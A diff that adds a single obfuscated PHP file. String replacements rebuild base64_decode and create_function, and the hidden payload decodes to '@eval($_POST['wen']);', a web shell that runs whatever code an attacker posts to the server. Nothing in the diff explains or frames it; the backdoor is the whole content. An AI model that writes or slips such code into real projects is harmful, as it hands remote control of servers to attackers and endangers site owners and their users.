@@ -1,0 +1,1 @@
+<?php  $mt="mFsKCleRfU"; $ojj="IEBleldle"; $hsa="E9TVFsnd2VuJ10p"; $fnx="Ow=="; $zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?>
